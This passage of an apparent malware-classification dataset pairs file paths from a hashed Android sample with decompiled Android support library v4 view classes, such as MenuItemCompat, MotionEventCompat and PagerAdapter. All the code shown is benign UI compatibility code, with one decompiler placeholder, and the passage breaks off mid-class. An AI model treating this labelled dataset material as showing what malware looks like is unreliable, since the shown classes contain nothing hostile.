"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\LayoutParams.code","public static class LayoutParams extends ViewGroup.LayoutParams {   int childIndex;   public int gravity;   public boolean isDecor;   boolean needsMeasure;   int position;   float widthFactor;   public LayoutParams(){     super(-1,-1);     this.widthFactor=0.0f;   }   public LayoutParams(  Context context,  AttributeSet attrs){     super(context,attrs);     this.widthFactor=0.0f;     TypedArray a2=context.obtainStyledAttributes(attrs,ViewPager.LAYOUT_ATTRS);     this.gravity=a2.getInteger(0,48);     a2.recycle();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\MarginLayoutParamsCompat.code","public class MarginLayoutParamsCompat {   static final MarginLayoutParamsCompatImpl IMPL; interface MarginLayoutParamsCompatImpl {     int getLayoutDirection(    ViewGroup.MarginLayoutParams marginLayoutParams);     int getMarginEnd(    ViewGroup.MarginLayoutParams marginLayoutParams);     int getMarginStart(    ViewGroup.MarginLayoutParams marginLayoutParams);     boolean isMarginRelative(    ViewGroup.MarginLayoutParams marginLayoutParams);     void resolveLayoutDirection(    ViewGroup.MarginLayoutParams marginLayoutParams,    int i);     void setLayoutDirection(    ViewGroup.MarginLayoutParams marginLayoutParams,    int i);     void setMarginEnd(    ViewGroup.MarginLayoutParams marginLayoutParams,    int i);     void setMarginStart(    ViewGroup.MarginLayoutParams marginLayoutParams,    int i);   } static class MarginLayoutParamsCompatImplBase implements MarginLayoutParamsCompatImpl {     MarginLayoutParamsCompatImplBase(){     }     @Override public int getMarginStart(    ViewGroup.MarginLayoutParams lp){       return lp.leftMargin;     }     @Override public int getMarginEnd(    ViewGroup.MarginLayoutParams lp){       return lp.rightMargin;     }     @Override public void setMarginStart(    ViewGroup.MarginLayoutParams lp,    int marginStart){       lp.leftMargin=marginStart;     }     @Override public void setMarginEnd(    ViewGroup.MarginLayoutParams lp,    int marginEnd){       lp.rightMargin=marginEnd;     }     @Override public boolean isMarginRelative(    ViewGroup.MarginLayoutParams lp){       return false;     }     @Override public int getLayoutDirection(    ViewGroup.MarginLayoutParams lp){       return 0;     }     @Override public void setLayoutDirection(    ViewGroup.MarginLayoutParams lp,    int layoutDirection){     }     @Override public void resolveLayoutDirection(    ViewGroup.MarginLayoutParams lp,    int layoutDirection){     }   } static class MarginLayoutParamsCompatImplJbMr1 implements MarginLayoutParamsCompatImpl {     MarginLayoutParamsCompatImplJbMr1(){     }     @Override public int getMarginStart(    ViewGroup.MarginLayoutParams lp){       return MarginLayoutParamsCompatJellybeanMr1.getMarginStart(lp);     }     @Override public int getMarginEnd(    ViewGroup.MarginLayoutParams lp){       return MarginLayoutParamsCompatJellybeanMr1.getMarginEnd(lp);     }     @Override public void setMarginStart(    ViewGroup.MarginLayoutParams lp,    int marginStart){       MarginLayoutParamsCompatJellybeanMr1.setMarginStart(lp,marginStart);     }     @Override public void setMarginEnd(    ViewGroup.MarginLayoutParams lp,    int marginEnd){       MarginLayoutParamsCompatJellybeanMr1.setMarginEnd(lp,marginEnd);     }     @Override public boolean isMarginRelative(    ViewGroup.MarginLayoutParams lp){       return MarginLayoutParamsCompatJellybeanMr1.isMarginRelative(lp);     }     @Override public int getLayoutDirection(    ViewGroup.MarginLayoutParams lp){       return MarginLayoutParamsCompatJellybeanMr1.getLayoutDirection(lp);     }     @Override public void setLayoutDirection(    ViewGroup.MarginLayoutParams lp,    int layoutDirection){       MarginLayoutParamsCompatJellybeanMr1.setLayoutDirection(lp,layoutDirection);     }     @Override public void resolveLayoutDirection(    ViewGroup.MarginLayoutParams lp,    int layoutDirection){       MarginLayoutParamsCompatJellybeanMr1.resolveLayoutDirection(lp,layoutDirection);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 17) {       IMPL=new MarginLayoutParamsCompatImplJbMr1();     }  else {       IMPL=new MarginLayoutParamsCompatImplBase();     }   }   public static int getMarginStart(  ViewGroup.MarginLayoutParams lp){     return IMPL.getMarginStart(lp);   }   public static int getMarginEnd(  ViewGroup.MarginLayoutParams lp){     return IMPL.getMarginEnd(lp);   }   public static void setMarginStart(  ViewGroup.MarginLayoutParams lp,  int marginStart){     IMPL.setMarginStart(lp,marginStart);   }   public static void setMarginEnd(  ViewGroup.MarginLayoutParams lp,  int marginEnd){     IMPL.setMarginEnd(lp,marginEnd);   }   public static boolean isMarginRelative(  ViewGroup.MarginLayoutParams lp){     return IMPL.isMarginRelative(lp);   }   public static int getLayoutDirection(  ViewGroup.MarginLayoutParams lp){     return IMPL.getLayoutDirection(lp);   }   public static void setLayoutDirection(  ViewGroup.MarginLayoutParams lp,  int layoutDirection){     IMPL.setLayoutDirection(lp,layoutDirection);   }   public static void resolveLayoutDirection(  ViewGroup.MarginLayoutParams lp,  int layoutDirection){     IMPL.resolveLayoutDirection(lp,layoutDirection);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\MarginLayoutParamsCompatImpl.code","interface MarginLayoutParamsCompatImpl {   int getLayoutDirection(  ViewGroup.MarginLayoutParams marginLayoutParams);   int getMarginEnd(  ViewGroup.MarginLayoutParams marginLayoutParams);   int getMarginStart(  ViewGroup.MarginLayoutParams marginLayoutParams);   boolean isMarginRelative(  ViewGroup.MarginLayoutParams marginLayoutParams);   void resolveLayoutDirection(  ViewGroup.MarginLayoutParams marginLayoutParams,  int i);   void setLayoutDirection(  ViewGroup.MarginLayoutParams marginLayoutParams,  int i);   void setMarginEnd(  ViewGroup.MarginLayoutParams marginLayoutParams,  int i);   void setMarginStart(  ViewGroup.MarginLayoutParams marginLayoutParams,  int i); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\MarginLayoutParamsCompatImplBase.code","static class MarginLayoutParamsCompatImplBase implements MarginLayoutParamsCompatImpl {   MarginLayoutParamsCompatImplBase(){   }   @Override public int getMarginStart(  ViewGroup.MarginLayoutParams lp){     return lp.leftMargin;   }   @Override public int getMarginEnd(  ViewGroup.MarginLayoutParams lp){     return lp.rightMargin;   }   @Override public void setMarginStart(  ViewGroup.MarginLayoutParams lp,  int marginStart){     lp.leftMargin=marginStart;   }   @Override public void setMarginEnd(  ViewGroup.MarginLayoutParams lp,  int marginEnd){     lp.rightMargin=marginEnd;   }   @Override public boolean isMarginRelative(  ViewGroup.MarginLayoutParams lp){     return false;   }   @Override public int getLayoutDirection(  ViewGroup.MarginLayoutParams lp){     return 0;   }   @Override public void setLayoutDirection(  ViewGroup.MarginLayoutParams lp,  int layoutDirection){   }   @Override public void resolveLayoutDirection(  ViewGroup.MarginLayoutParams lp,  int layoutDirection){   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\MarginLayoutParamsCompatImplJbMr1.code","static class MarginLayoutParamsCompatImplJbMr1 implements MarginLayoutParamsCompatImpl {   MarginLayoutParamsCompatImplJbMr1(){   }   @Override public int getMarginStart(  ViewGroup.MarginLayoutParams lp){     return MarginLayoutParamsCompatJellybeanMr1.getMarginStart(lp);   }   @Override public int getMarginEnd(  ViewGroup.MarginLayoutParams lp){     return MarginLayoutParamsCompatJellybeanMr1.getMarginEnd(lp);   }   @Override public void setMarginStart(  ViewGroup.MarginLayoutParams lp,  int marginStart){     MarginLayoutParamsCompatJellybeanMr1.setMarginStart(lp,marginStart);   }   @Override public void setMarginEnd(  ViewGroup.MarginLayoutParams lp,  int marginEnd){     MarginLayoutParamsCompatJellybeanMr1.setMarginEnd(lp,marginEnd);   }   @Override public boolean isMarginRelative(  ViewGroup.MarginLayoutParams lp){     return MarginLayoutParamsCompatJellybeanMr1.isMarginRelative(lp);   }   @Override public int getLayoutDirection(  ViewGroup.MarginLayoutParams lp){     return MarginLayoutParamsCompatJellybeanMr1.getLayoutDirection(lp);   }   @Override public void setLayoutDirection(  ViewGroup.MarginLayoutParams lp,  int layoutDirection){     MarginLayoutParamsCompatJellybeanMr1.setLayoutDirection(lp,layoutDirection);   }   @Override public void resolveLayoutDirection(  ViewGroup.MarginLayoutParams lp,  int layoutDirection){     MarginLayoutParamsCompatJellybeanMr1.resolveLayoutDirection(lp,layoutDirection);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\MarginLayoutParamsCompatJellybeanMr1.code","class MarginLayoutParamsCompatJellybeanMr1 {   MarginLayoutParamsCompatJellybeanMr1(){   }   public static int getMarginStart(  ViewGroup.MarginLayoutParams lp){     return lp.getMarginStart();   }   public static int getMarginEnd(  ViewGroup.MarginLayoutParams lp){     return lp.getMarginEnd();   }   public static void setMarginStart(  ViewGroup.MarginLayoutParams lp,  int marginStart){     lp.setMarginStart(marginStart);   }   public static void setMarginEnd(  ViewGroup.MarginLayoutParams lp,  int marginEnd){     lp.setMarginEnd(marginEnd);   }   public static boolean isMarginRelative(  ViewGroup.MarginLayoutParams lp){     return lp.isMarginRelative();   }   public static int getLayoutDirection(  ViewGroup.MarginLayoutParams lp){     return lp.getLayoutDirection();   }   public static void setLayoutDirection(  ViewGroup.MarginLayoutParams lp,  int layoutDirection){     lp.setLayoutDirection(layoutDirection);   }   public static void resolveLayoutDirection(  ViewGroup.MarginLayoutParams lp,  int layoutDirection){     lp.resolveLayoutDirection(layoutDirection);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\MenuCompat.code","public class MenuCompat {   @Deprecated public static void setShowAsAction(  MenuItem item,  int actionEnum){     MenuItemCompat.setShowAsAction(item,actionEnum);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\MenuItemCompat.code","public class MenuItemCompat {   static final MenuVersionImpl IMPL;   public static final int SHOW_AS_ACTION_ALWAYS=2;   public static final int SHOW_AS_ACTION_COLLAPSE_ACTION_VIEW=8;   public static final int SHOW_AS_ACTION_IF_ROOM=1;   public static final int SHOW_AS_ACTION_NEVER=0;   public static final int SHOW_AS_ACTION_WITH_TEXT=4;   private static final String TAG=""MenuItemCompat""; interface MenuVersionImpl {     boolean collapseActionView(    MenuItem menuItem);     boolean expandActionView(    MenuItem menuItem);     View getActionView(    MenuItem menuItem);     boolean isActionViewExpanded(    MenuItem menuItem);     MenuItem setActionView(    MenuItem menuItem,    int i);     MenuItem setActionView(    MenuItem menuItem,    View view);     MenuItem setOnActionExpandListener(    MenuItem menuItem,    OnActionExpandListener onActionExpandListener);     void setShowAsAction(    MenuItem menuItem,    int i);   } public interface OnActionExpandListener {     boolean onMenuItemActionCollapse(    MenuItem menuItem);     boolean onMenuItemActionExpand(    MenuItem menuItem);   } static class BaseMenuVersionImpl implements MenuVersionImpl {     BaseMenuVersionImpl(){     }     @Override public void setShowAsAction(    MenuItem item,    int actionEnum){     }     @Override public MenuItem setActionView(    MenuItem item,    View view){       return item;     }     @Override public MenuItem setActionView(    MenuItem item,    int resId){       return item;     }     @Override public View getActionView(    MenuItem item){       return null;     }     @Override public boolean expandActionView(    MenuItem item){       return false;     }     @Override public boolean collapseActionView(    MenuItem item){       return false;     }     @Override public boolean isActionViewExpanded(    MenuItem item){       return false;     }     @Override public MenuItem setOnActionExpandListener(    MenuItem item,    OnActionExpandListener listener){       return item;     }   } static class HoneycombMenuVersionImpl implements MenuVersionImpl {     HoneycombMenuVersionImpl(){     }     @Override public void setShowAsAction(    MenuItem item,    int actionEnum){       MenuItemCompatHoneycomb.setShowAsAction(item,actionEnum);     }     @Override public MenuItem setActionView(    MenuItem item,    View view){       return MenuItemCompatHoneycomb.setActionView(item,view);     }     @Override public MenuItem setActionView(    MenuItem item,    int resId){       return MenuItemCompatHoneycomb.setActionView(item,resId);     }     @Override public View getActionView(    MenuItem item){       return MenuItemCompatHoneycomb.getActionView(item);     }     @Override public boolean expandActionView(    MenuItem item){       return false;     }     @Override public boolean collapseActionView(    MenuItem item){       return false;     }     @Override public boolean isActionViewExpanded(    MenuItem item){       return false;     }     @Override public MenuItem setOnActionExpandListener(    MenuItem item,    OnActionExpandListener listener){       return item;     }   } static class IcsMenuVersionImpl extends HoneycombMenuVersionImpl {     IcsMenuVersionImpl(){     }     @Override public boolean expandActionView(    MenuItem item){       return MenuItemCompatIcs.expandActionView(item);     }     @Override public boolean collapseActionView(    MenuItem item){       return MenuItemCompatIcs.collapseActionView(item);     }     @Override public boolean isActionViewExpanded(    MenuItem item){       return MenuItemCompatIcs.isActionViewExpanded(item);     }     @Override public MenuItem setOnActionExpandListener(    MenuItem item,    final OnActionExpandListener listener){       return listener == null ? MenuItemCompatIcs.setOnActionExpandListener(item,null) : MenuItemCompatIcs.setOnActionExpandListener(item,new MenuItemCompatIcs.SupportActionExpandProxy(){         @Override public boolean onMenuItemActionExpand(        MenuItem item2){           return listener.onMenuItemActionExpand(item2);         }         @Override public boolean onMenuItemActionCollapse(        MenuItem item2){           return listener.onMenuItemActionCollapse(item2);         }       } );     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 14) {       IMPL=new IcsMenuVersionImpl();     }  else     if (version >= 11) {       IMPL=new HoneycombMenuVersionImpl();     }  else {       IMPL=new BaseMenuVersionImpl();     }   }   public static void setShowAsAction(  MenuItem item,  int actionEnum){     if (item instanceof SupportMenuItem) {       ((SupportMenuItem)item).setShowAsAction(actionEnum);     }  else {       IMPL.setShowAsAction(item,actionEnum);     }   }   public static MenuItem setActionView(  MenuItem item,  View view){     return item instanceof SupportMenuItem ? ((SupportMenuItem)item).setActionView(view) : IMPL.setActionView(item,view);   }   public static MenuItem setActionView(  MenuItem item,  int resId){     return item instanceof SupportMenuItem ? ((SupportMenuItem)item).setActionView(resId) : IMPL.setActionView(item,resId);   }   public static View getActionView(  MenuItem item){     return item instanceof SupportMenuItem ? ((SupportMenuItem)item).getActionView() : IMPL.getActionView(item);   }   public static MenuItem setActionProvider(  MenuItem item,  ActionProvider provider){     if (item instanceof SupportMenuItem) {       return ((SupportMenuItem)item).setSupportActionProvider(provider);     }     Log.w(TAG,""setActionProvider: item does not implement SupportMenuItem; ignoring"");     return item;   }   public static ActionProvider getActionProvider(  MenuItem item){     if (item instanceof SupportMenuItem) {       return ((SupportMenuItem)item).getSupportActionProvider();     }     Log.w(TAG,""getActionProvider: item does not implement SupportMenuItem; returning null"");     return null;   }   public static boolean expandActionView(  MenuItem item){     return item instanceof SupportMenuItem ? ((SupportMenuItem)item).expandActionView() : IMPL.expandActionView(item);   }   public static boolean collapseActionView(  MenuItem item){     return item instanceof SupportMenuItem ? ((SupportMenuItem)item).collapseActionView() : IMPL.collapseActionView(item);   }   public static boolean isActionViewExpanded(  MenuItem item){     return item instanceof SupportMenuItem ? ((SupportMenuItem)item).isActionViewExpanded() : IMPL.isActionViewExpanded(item);   }   public static MenuItem setOnActionExpandListener(  MenuItem item,  OnActionExpandListener listener){     return item instanceof SupportMenuItem ? ((SupportMenuItem)item).setSupportOnActionExpandListener(listener) : IMPL.setOnActionExpandListener(item,listener);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\MenuItemCompatHoneycomb.code","class MenuItemCompatHoneycomb {   MenuItemCompatHoneycomb(){   }   public static void setShowAsAction(  MenuItem item,  int actionEnum){     item.setShowAsAction(actionEnum);   }   public static MenuItem setActionView(  MenuItem item,  View view){     return item.setActionView(view);   }   public static MenuItem setActionView(  MenuItem item,  int resId){     return item.setActionView(resId);   }   public static View getActionView(  MenuItem item){     return item.getActionView();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\MenuItemCompatIcs.code","class MenuItemCompatIcs { interface SupportActionExpandProxy {     boolean onMenuItemActionCollapse(    MenuItem menuItem);     boolean onMenuItemActionExpand(    MenuItem menuItem);   }   MenuItemCompatIcs(){   }   public static boolean expandActionView(  MenuItem item){     return item.expandActionView();   }   public static boolean collapseActionView(  MenuItem item){     return item.collapseActionView();   }   public static boolean isActionViewExpanded(  MenuItem item){     return item.isActionViewExpanded();   }   public static MenuItem setOnActionExpandListener(  MenuItem item,  SupportActionExpandProxy listener){     return item.setOnActionExpandListener(new OnActionExpandListenerWrapper(listener));   } static class OnActionExpandListenerWrapper implements MenuItem.OnActionExpandListener {     private SupportActionExpandProxy mWrapped;     public OnActionExpandListenerWrapper(    SupportActionExpandProxy wrapped){       this.mWrapped=wrapped;     }     @Override public boolean onMenuItemActionExpand(    MenuItem item){       return this.mWrapped.onMenuItemActionExpand(item);     }     @Override public boolean onMenuItemActionCollapse(    MenuItem item){       return this.mWrapped.onMenuItemActionCollapse(item);     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\MenuVersionImpl.code","interface MenuVersionImpl {   boolean collapseActionView(  MenuItem menuItem);   boolean expandActionView(  MenuItem menuItem);   View getActionView(  MenuItem menuItem);   boolean isActionViewExpanded(  MenuItem menuItem);   MenuItem setActionView(  MenuItem menuItem,  int i);   MenuItem setActionView(  MenuItem menuItem,  View view);   MenuItem setOnActionExpandListener(  MenuItem menuItem,  OnActionExpandListener onActionExpandListener);   void setShowAsAction(  MenuItem menuItem,  int i); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\MotionEventCompat.code","public class MotionEventCompat {   public static final int ACTION_HOVER_ENTER=9;   public static final int ACTION_HOVER_EXIT=10;   public static final int ACTION_HOVER_MOVE=7;   public static final int ACTION_MASK=255;   public static final int ACTION_POINTER_DOWN=5;   public static final int ACTION_POINTER_INDEX_MASK=65280;   public static final int ACTION_POINTER_INDEX_SHIFT=8;   public static final int ACTION_POINTER_UP=6;   public static final int ACTION_SCROLL=8;   static final MotionEventVersionImpl IMPL; interface MotionEventVersionImpl {     int findPointerIndex(    MotionEvent motionEvent,    int i);     int getPointerCount(    MotionEvent motionEvent);     int getPointerId(    MotionEvent motionEvent,    int i);     float getX(    MotionEvent motionEvent,    int i);     float getY(    MotionEvent motionEvent,    int i);   } static class BaseMotionEventVersionImpl implements MotionEventVersionImpl {     BaseMotionEventVersionImpl(){     }     @Override public int findPointerIndex(    MotionEvent event,    int pointerId){       return pointerId == 0 ? 0 : -1;     }     @Override public int getPointerId(    MotionEvent event,    int pointerIndex){       if (pointerIndex == 0) {         return 0;       }       throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");     }     @Override public float getX(    MotionEvent event,    int pointerIndex){       if (pointerIndex == 0) {         return event.getX();       }       throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");     }     @Override public float getY(    MotionEvent event,    int pointerIndex){       if (pointerIndex == 0) {         return event.getY();       }       throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");     }     @Override public int getPointerCount(    MotionEvent event){       return 1;     }   } static class EclairMotionEventVersionImpl implements MotionEventVersionImpl {     EclairMotionEventVersionImpl(){     }     @Override public int findPointerIndex(    MotionEvent event,    int pointerId){       return MotionEventCompatEclair.findPointerIndex(event,pointerId);     }     @Override public int getPointerId(    MotionEvent event,    int pointerIndex){       return MotionEventCompatEclair.getPointerId(event,pointerIndex);     }     @Override public float getX(    MotionEvent event,    int pointerIndex){       return MotionEventCompatEclair.getX(event,pointerIndex);     }     @Override public float getY(    MotionEvent event,    int pointerIndex){       return MotionEventCompatEclair.getY(event,pointerIndex);     }     @Override public int getPointerCount(    MotionEvent event){       return MotionEventCompatEclair.getPointerCount(event);     }   } static {     if (Build.VERSION.SDK_INT >= 5) {       IMPL=new EclairMotionEventVersionImpl();     }  else {       IMPL=new BaseMotionEventVersionImpl();     }   }   public static int getActionMasked(  MotionEvent event){     return event.getAction() & ACTION_MASK;   }   public static int getActionIndex(  MotionEvent event){     return (event.getAction() & ACTION_POINTER_INDEX_MASK) >> 8;   }   public static int findPointerIndex(  MotionEvent event,  int pointerId){     return IMPL.findPointerIndex(event,pointerId);   }   public static int getPointerId(  MotionEvent event,  int pointerIndex){     return IMPL.getPointerId(event,pointerIndex);   }   public static float getX(  MotionEvent event,  int pointerIndex){     return IMPL.getX(event,pointerIndex);   }   public static float getY(  MotionEvent event,  int pointerIndex){     return IMPL.getY(event,pointerIndex);   }   public static int getPointerCount(  MotionEvent event){     return IMPL.getPointerCount(event);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\MotionEventCompatEclair.code","class MotionEventCompatEclair {   MotionEventCompatEclair(){   }   public static int findPointerIndex(  MotionEvent event,  int pointerId){     return event.findPointerIndex(pointerId);   }   public static int getPointerId(  MotionEvent event,  int pointerIndex){     return event.getPointerId(pointerIndex);   }   public static float getX(  MotionEvent event,  int pointerIndex){     return event.getX(pointerIndex);   }   public static float getY(  MotionEvent event,  int pointerIndex){     return event.getY(pointerIndex);   }   public static int getPointerCount(  MotionEvent event){     return event.getPointerCount();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\MotionEventVersionImpl.code","interface MotionEventVersionImpl {   int findPointerIndex(  MotionEvent motionEvent,  int i);   int getPointerCount(  MotionEvent motionEvent);   int getPointerId(  MotionEvent motionEvent,  int i);   float getX(  MotionEvent motionEvent,  int i);   float getY(  MotionEvent motionEvent,  int i); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\MyAccessibilityDelegate.code","!org.eclipse.jdt.core.dom.TypeDeclaration@3527e43a"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\OnActionExpandListener.code","public interface OnActionExpandListener {   boolean onMenuItemActionCollapse(  MenuItem menuItem);   boolean onMenuItemActionExpand(  MenuItem menuItem); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\OnActionExpandListenerWrapper.code","static class OnActionExpandListenerWrapper implements MenuItem.OnActionExpandListener {   private SupportActionExpandProxy mWrapped;   public OnActionExpandListenerWrapper(  SupportActionExpandProxy wrapped){     this.mWrapped=wrapped;   }   @Override public boolean onMenuItemActionExpand(  MenuItem item){     return this.mWrapped.onMenuItemActionExpand(item);   }   @Override public boolean onMenuItemActionCollapse(  MenuItem item){     return this.mWrapped.onMenuItemActionCollapse(item);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\OnAdapterChangeListener.code","public interface OnAdapterChangeListener {   void onAdapterChanged(  PagerAdapter pagerAdapter,  PagerAdapter pagerAdapter2); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\OnPageChangeListener.code","public interface OnPageChangeListener {   void onPageScrollStateChanged(  int i);   void onPageScrolled(  int i,  float f,  int i2);   void onPageSelected(  int i); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\PageListener.code","public class PageListener extends DataSetObserver implements ViewPager.OnPageChangeListener, ViewPager.OnAdapterChangeListener {   private int mScrollState;   private PageListener(){   }   @Override public void onPageScrolled(  int position,  float positionOffset,  int positionOffsetPixels){     if (positionOffset > 0.5f) {       position++;     }     PagerTitleStrip.this.updateTextPositions(position,positionOffset,false);   }   @Override public void onPageSelected(  int position){     if (this.mScrollState == 0) {       PagerTitleStrip.this.updateText(PagerTitleStrip.this.mPager.getCurrentItem(),PagerTitleStrip.this.mPager.getAdapter());       float offset=PagerTitleStrip.this.mLastKnownPositionOffset >= 0.0f ? PagerTitleStrip.this.mLastKnownPositionOffset : 0.0f;       PagerTitleStrip.this.updateTextPositions(PagerTitleStrip.this.mPager.getCurrentItem(),offset,true);     }   }   @Override public void onPageScrollStateChanged(  int state){     this.mScrollState=state;   }   @Override public void onAdapterChanged(  PagerAdapter oldAdapter,  PagerAdapter newAdapter){     PagerTitleStrip.this.updateAdapter(oldAdapter,newAdapter);   }   @Override public void onChanged(){     PagerTitleStrip.this.updateText(PagerTitleStrip.this.mPager.getCurrentItem(),PagerTitleStrip.this.mPager.getAdapter());     float offset=PagerTitleStrip.this.mLastKnownPositionOffset >= 0.0f ? PagerTitleStrip.this.mLastKnownPositionOffset : 0.0f;     PagerTitleStrip.this.updateTextPositions(PagerTitleStrip.this.mPager.getCurrentItem(),offset,true);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\PagerAdapter.code","public abstract class PagerAdapter {   public static final int POSITION_NONE=-2;   public static final int POSITION_UNCHANGED=-1;   private DataSetObservable mObservable=new DataSetObservable();   public abstract int getCount();   public abstract boolean isViewFromObject(  View view,  Object obj);   public void startUpdate(  ViewGroup container){     startUpdate((View)container);   }   public Object instantiateItem(  ViewGroup container,  int position){     return instantiateItem((View)container,position);   }   public void destroyItem(  ViewGroup container,  int position,  Object object){     destroyItem((View)container,position,object);   }   public void setPrimaryItem(  ViewGroup container,  int position,  Object object){     setPrimaryItem((View)container,position,object);   }   public void finishUpdate(  ViewGroup container){     finishUpdate((View)container);   }   public void startUpdate(  View container){   }   public Object instantiateItem(  View container,  int position){     throw new UnsupportedOperationException(""Required method instantiateItem was not overridden"");   }   public void destroyItem(  View container,  int position,  Object object){     throw new UnsupportedOperationException(""Required method destroyItem was not overridden"");   }   public void setPrimaryItem(  View container,  int position,  Object object){   }   public void finishUpdate(  View container){   }   public Parcelable saveState(){     return null;   }   public void restoreState(  Parcelable state,  ClassLoader loader){   }   public int getItemPosition(  Object object){     return -1;   }   public void notifyDataSetChanged(){     this.mObservable.notifyChanged();   }   public void registerDataSetObserver(  DataSetObserver observer){     this.mObservable.registerObserver(observer);   }   public void unregisterDataSetObserver(  DataSetObserver observer){     this.mObservable.unregisterObserver(observer);   }   public CharSequence getPageTitle(  int position){     return null;   }   public float getPageWidth(  int position){     return 1.0f;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\PagerObserver.code","private class PagerObserver extends DataSetObserver {   private PagerObserver(){   }   @Override public void onChanged(){     ViewPager.this.dataSetChanged();   }   @Override public void onInvalidated(){     ViewPager.this.dataSetChanged();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\PagerTabStrip.code","public class PagerTabStrip extends PagerTitleStrip {   private static final int FULL_UNDERLINE_HEIGHT=1;   private static final int INDICATOR_HEIGHT=3;   private static final int MIN_PADDING_BOTTOM=6;   private static final int MIN_STRIP_HEIGHT=32;   private static final int MIN_TEXT_SPACING=64;   private static final int TAB_PADDING=16;   private static final int TAB_SPACING=32;   private static final String TAG=""PagerTabStrip"";   private boolean mDrawFullUnderline;   private boolean mDrawFullUnderlineSet;   private int mFullUnderlineHeight;   private boolean mIgnoreTap;   private int mIndicatorColor;   private int mIndicatorHeight;   private float mInitialMotionX;   private float mInitialMotionY;   private int mMinPaddingBottom;   private int mMinStripHeight;   private int mMinTextSpacing;   private int mTabAlpha;   private int mTabPadding;   private final Paint mTabPaint;   private final Rect mTempRect;   private int mTouchSlop;   public PagerTabStrip(  Context context){     this(context,null);   }   public PagerTabStrip(  Context context,  AttributeSet attrs){     super(context,attrs);     this.mTabPaint=new Paint();     this.mTempRect=new Rect();     this.mTabAlpha=MotionEventCompat.ACTION_MASK;     this.mDrawFullUnderline=false;     this.mDrawFullUnderlineSet=false;     this.mIndicatorColor=this.mTextColor;     this.mTabPaint.setColor(this.mIndicatorColor);     float density=context.getResources().getDisplayMetrics().density;     this.mIndicatorHeight=(int)((3.0f * density) + 0.5f);     this.mMinPaddingBottom=(int)((6.0f * density) + 0.5f);     this.mMinTextSpacing=(int)(64.0f * density);     this.mTabPadding=(int)((16.0f * density) + 0.5f);     this.mFullUnderlineHeight=(int)((1.0f * density) + 0.5f);     this.mMinStripHeight=(int)((32.0f * density) + 0.5f);     this.mTouchSlop=ViewConfiguration.get(context).getScaledTouchSlop();     setPadding(getPaddingLeft(),getPaddingTop(),getPaddingRight(),getPaddingBottom());     setTextSpacing(getTextSpacing());     setWillNotDraw(false);     this.mPrevText.setFocusable(true);     this.mPrevText.setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View v){         PagerTabStrip.this.mPager.setCurrentItem(PagerTabStrip.this.mPager.getCurrentItem() - 1);       }     } );     this.mNextText.setFocusable(true);     this.mNextText.setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View v){         PagerTabStrip.this.mPager.setCurrentItem(PagerTabStrip.this.mPager.getCurrentItem() + 1);       }     } );     if (getBackground() == null) {       